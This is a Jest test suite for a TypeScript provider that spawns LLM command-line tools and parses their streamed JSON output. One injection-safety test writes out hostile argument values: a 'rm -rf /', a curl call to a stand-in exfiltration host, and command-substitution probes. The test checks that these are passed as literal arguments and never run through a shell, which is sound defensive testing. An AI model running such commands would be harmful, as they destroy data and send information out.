import { EventEmitter } from 'node:events';
import { spawn } from 'node:child_process';
import { AnalisadorEventosCli, CliProvider } from './cli.provider';
import type { EventoProvedor, PedidoGeracao } from './llm-provider';
import type { ConfigDoProvedor } from './provider.factory';

jest.mock('node:child_process', () => ({ spawn: jest.fn() }));

const spawnFalso = spawn as unknown as jest.Mock;

const pedido: PedidoGeracao = {
  sistema: 'Você é o Oráculo.',
  mensagens: [{ papel: 'usuario', texto: 'oi' }],
  maxTokens: 100,
};

function configCli(
  dialeto: string,
  comando = 'agy',
  modelo: string | null = 'gemini-3.6-flash-low',
): ConfigDoProvedor {
  return {
    tipo: 'cli',
    cliComando: comando,
    cliTimeoutMs: 5_000,
    cliDialeto: dialeto,
    cliModelo: modelo ?? undefined,
    anthropicModelo: 'claude-haiku-4-5-20251001',
  } as unknown as ConfigDoProvedor;
}

function prepararProcesso(saida: string[], codigo = 0) {
  const stdout = new EventEmitter() as EventEmitter & {
    setEncoding: (codificacao: string) => void;
  };
  stdout.setEncoding = () => undefined;

  const stderr = new EventEmitter() as EventEmitter & {
    setEncoding: (codificacao: string) => void;
  };
  stderr.setEncoding = () => undefined;

  const processo = new EventEmitter() as EventEmitter & {
    stdout: typeof stdout;
    stderr: typeof stderr;
    kill: () => void;
  };
  processo.stdout = stdout;
  processo.stderr = stderr;
  processo.kill = () => undefined;

  spawnFalso.mockImplementation(() => {
    setImmediate(() => {
      for (const pedaco of saida) {
        stdout.emit('data', pedaco);
      }
      processo.emit('close', codigo);
    });

    return processo;
  });
}

async function coletar(
  fluxo: AsyncIterable<EventoProvedor>,
): Promise<EventoProvedor[]> {
  const eventos: EventoProvedor[] = [];
  for await (const evento of fluxo) {
    eventos.push(evento);
  }
  return eventos;
}

describe('AnalisadorEventosCli', () => {
  it('emite texto para content_block_delta quando o bloco é text', () => {
    const analisador = new AnalisadorEventosCli();

    const linhaInicio = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_start',
        index: 0,
        content_block: { type: 'text' },
      },
    });
    const linhaDelta = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_delta',
        index: 0,
        delta: { type: 'text_delta', text: 'Olá' },
      },
    });

    const eventos = [
      ...analisador.processarChunk(linhaInicio + '\n'),
      ...analisador.processarChunk(linhaDelta + '\n'),
    ];

    expect(eventos).toEqual([{ tipo: 'texto', fragmento: 'Olá' }]);
  });

  it('emite raciocinio para thinking_delta', () => {
    const analisador = new AnalisadorEventosCli();

    const linhaDelta = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_delta',
        index: 1,
        delta: { type: 'thinking_delta', thinking: 'pensando...' },
      },
    });

    const eventos = analisador.processarChunk(linhaDelta + '\n');

    expect(eventos).toEqual([{ tipo: 'raciocinio', fragmento: 'pensando...' }]);
  });

  it('não emite texto para delta cujo bloco não é text', () => {
    const analisador = new AnalisadorEventosCli();

    const linhaInicio = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_start',
        index: 0,
        content_block: { type: 'tool_use' },
      },
    });
    const linhaDelta = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_delta',
        index: 0,
        delta: { type: 'text_delta', text: 'não deveria aparecer' },
      },
    });

    const eventos = [
      ...analisador.processarChunk(linhaInicio + '\n'),
      ...analisador.processarChunk(linhaDelta + '\n'),
    ];

    expect(eventos).toEqual([]);
  });

  it('emite fim com os campos da linha de resultado', () => {
    const analisador = new AnalisadorEventosCli();

    const linha = JSON.stringify({
      type: 'result',
      is_error: false,
      duration_api_ms: 1234,
      usage: { input_tokens: 10, output_tokens: 20 },
      total_cost_usd: 0.005,
    });

    const eventos = analisador.processarChunk(linha + '\n');

    expect(eventos).toEqual([
      {
        tipo: 'fim',
        tokensEntrada: 10,
        tokensSaida: 20,
        duracaoMs: 1234,
        custoUsd: 0.005,
      },
    ]);
  });

  it('ignora linhas system, rate_limit_event e assistant', () => {
    const analisador = new AnalisadorEventosCli();

    const linhas = [
      { type: 'system' },
      { type: 'rate_limit_event' },
      { type: 'assistant', message: { content: [] } },
    ]
      .map((linha) => JSON.stringify(linha))
      .join('\n');

    const eventos = analisador.processarChunk(linhas + '\n');

    expect(eventos).toEqual([]);
  });

  it('ignora linha JSON inválida sem derrubar o analisador', () => {
    const analisador = new AnalisadorEventosCli();

    const eventos = analisador.processarChunk('{ isso não é json válido\n');

    expect(eventos).toEqual([]);
  });

  it('reconstrói uma linha JSON partida entre dois chunks de stdout', () => {
    const analisador = new AnalisadorEventosCli();

    const linhaCompleta = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_delta',
        index: 3,
        delta: { type: 'thinking_delta', thinking: 'fragmento partido' },
      },
    });

    const metade = Math.floor(linhaCompleta.length / 2);
    const primeiraParte = linhaCompleta.slice(0, metade);
    const segundaParte = linhaCompleta.slice(metade);

    const eventosPrimeiroChunk = analisador.processarChunk(primeiraParte);
    expect(eventosPrimeiroChunk).toEqual([]);

    const eventosSegundoChunk = analisador.processarChunk(segundaParte + '\n');
    expect(eventosSegundoChunk).toEqual([
      { tipo: 'raciocinio', fragmento: 'fragmento partido' },
    ]);
  });

  it('continua funcionando após uma linha inválida seguida de uma linha válida', () => {
    const analisador = new AnalisadorEventosCli();

    const linhaValida = JSON.stringify({
      type: 'stream_event',
      event: {
        type: 'content_block_delta',
        index: 5,
        delta: { type: 'thinking_delta', thinking: 'depois do erro' },
      },
    });

    const eventos = analisador.processarChunk(
      '{quebrado\n' + linhaValida + '\n',
    );

    expect(eventos).toEqual([
      { tipo: 'raciocinio', fragmento: 'depois do erro' },
    ]);
  });
});

describe('CliProvider com os dialetos embutidos', () => {
  beforeEach(() => {
    spawnFalso.mockReset();
  });

  it('chama o agy com o mesmo argv de sempre', async () => {
    prepararProcesso([
      JSON.stringify({
        event: 'step_update',
        step_update: { step_type: 'agent_response', text_delta: 'resposta' },
      }) + '\n',
    ]);

    await coletar(new CliProvider(configCli('agy')).gerar(pedido));

    expect(spawnFalso).toHaveBeenCalledTimes(1);
    expect(spawnFalso.mock.calls[0]).toEqual([
      'agy',
      [
        '-p',
        'Você é o Oráculo.\n\nusuario: oi',
        '--output-format',
        'stream-json',
        '--disable-slash-commands',
        '--print-timeout',
        '5s',
        '--model',
        'gemini-3.6-flash-low',
      ],
      { stdio: ['ignore', 'pipe', 'pipe'] },
    ]);
  });

  it('chama o claude com o mesmo argv de sempre, inclusive as flags de segurança', async () => {
    prepararProcesso([
      JSON.stringify({
        type: 'stream_event',
        event: {
          type: 'content_block_start',
          index: 0,
          content_block: { type: 'text' },
        },
      }) +
        '\n' +
        JSON.stringify({
          type: 'stream_event',
          event: {
            type: 'content_block_delta',
            index: 0,
            delta: { type: 'text_delta', text: 'resposta' },
          },
        }) +
        '\n',
    ]);

    await coletar(
      new CliProvider(configCli('claude', 'claude', null)).gerar(pedido),
    );

    expect(spawnFalso).toHaveBeenCalledTimes(1);
    expect(spawnFalso.mock.calls[0]).toEqual([
      'claude',
      [
        '-p',
        'usuario: oi',
        '--output-format',
        'stream-json',
        '--verbose',
        '--include-partial-messages',
        '--strict-mcp-config',
        '--mcp-config',
        '{"mcpServers":{}}',
        '--model',
        'claude-haiku-4-5-20251001',
        '--tools',
        'NenhumaFerramentaNativa',
        '--allowedTools',
        'FerramentaInexistente',
        '--exclude-dynamic-system-prompt-sections',
        '--system-prompt',
        'Você é o Oráculo.',
      ],
      { stdio: ['ignore', 'pipe', 'pipe'] },
    ]);
  });

  it('não acrescenta evento de fim ao dialeto embutido', async () => {
    prepararProcesso([
      JSON.stringify({
        event: 'step_update',
        step_update: { step_type: 'agent_response', text_delta: 'resposta' },
      }) + '\n',
    ]);

    const eventos = await coletar(
      new CliProvider(configCli('agy')).gerar(pedido),
    );

    expect(eventos).toEqual([{ tipo: 'texto', fragmento: 'resposta' }]);
  });
});

describe('CliProvider com dialeto personalizado', () => {
  beforeEach(() => {
    spawnFalso.mockReset();
  });

  it('roda o binário configurado com o argv do descritor', async () => {
    prepararProcesso([
      JSON.stringify({ saida: { texto: 'resposta do meu cli' } }) + '\n',
    ]);

    const dialeto = JSON.stringify({
      id: 'meucli',
      rotulo: 'Meu CLI',
      argumentos: ['--ask', '{prompt}', '--modelo', '{modelo?}'],
      formatoSaida: 'json-por-linha',
      caminhoTexto: 'saida.texto',
    });

    const eventos = await coletar(
      new CliProvider(configCli(dialeto, 'meucli')).gerar(pedido),
    );

    expect(eventos).toContainEqual({
      tipo: 'texto',
      fragmento: 'resposta do meu cli',
    });

    const [binario, argv, opcoes] = spawnFalso.mock.calls[0] as [
      string,
      string[],
      Record<string, unknown>,
    ];

    expect(binario).toBe('meucli');
    expect(argv).toEqual([
      '--ask',
      'usuario: oi',
      '--modelo',
      'gemini-3.6-flash-low',
    ]);
    expect(opcoes.shell).toBeUndefined();
  });

  it('em texto-puro entrega a saída crua como texto', async () => {
    prepararProcesso(['resposta ', 'em duas partes']);

    const dialeto = JSON.stringify({
      id: 'simples',
      argumentos: ['{promptComSistema}'],
      formatoSaida: 'texto-puro',
    });

    const eventos = await coletar(
      new CliProvider(configCli(dialeto, 'simples')).gerar(pedido),
    );

    expect(eventos).toEqual([
      { tipo: 'texto', fragmento: 'resposta ' },
      { tipo: 'texto', fragmento: 'em duas partes' },
      { tipo: 'fim', tokensEntrada: 0, tokensSaida: 0, duracaoMs: 0 },
    ]);
  });

  it('vira erro tratado quando o descritor não é JSON válido', async () => {
    prepararProcesso([]);

    const eventos = await coletar(
      new CliProvider(configCli('{ isso não é json')).gerar(pedido),
    );

    expect(eventos).toHaveLength(1);
    expect(eventos[0]).toMatchObject({
      tipo: 'erro',
      codigo: 'dialeto_invalido',
      retomavel: false,
    });
    expect(spawnFalso).not.toHaveBeenCalled();
  });

  it('trata argumento malicioso como argumento, nunca como comando', async () => {
    prepararProcesso(['tudo certo']);

    const dialeto = JSON.stringify({
      id: 'malicioso',
      argumentos: [
        '{prompt}',
        '; rm -rf /',
        '&& curl http://exfiltra.example.com',
        '$(whoami)',
        '`id`',
        '--dangerously-skip-permissions',
      ],
      formatoSaida: 'texto-puro',
    });

    await coletar(new CliProvider(configCli(dialeto)).gerar(pedido));

    const [binario, argv, opcoes] = spawnFalso.mock.calls[0] as [
      string,
      string[],
      Record<string, unknown>,
    ];

    expect(binario).toBe('agy');
    expect(Array.isArray(argv)).toBe(true);
    expect(opcoes.shell).toBeUndefined();
    expect(argv).toEqual([
      'usuario: oi',
      '; rm -rf /',
      '&& curl http://exfiltra.example.com',
      '$(whoami)',
      '`id`',
      '--dangerously-skip-permissions',
    ]);
  });

  it('não deixa o descritor escolher outro binário nem abrir shell', async () => {
    prepararProcesso(['ok']);

    const dialeto = JSON.stringify({
      id: 'troca-binario',
      argumentos: ['{prompt}'],
      formatoSaida: 'texto-puro',
    });

    await coletar(
      new CliProvider(configCli(dialeto, 'agy --coisa')).gerar(pedido),
    );

    const [binario, , opcoes] = spawnFalso.mock.calls[0] as [
      string,
      string[],
      Record<string, unknown>,
    ];

    expect(binario).toBe('agy');
    expect(opcoes).toEqual({ stdio: ['ignore', 'pipe', 'pipe'] });
  });
});
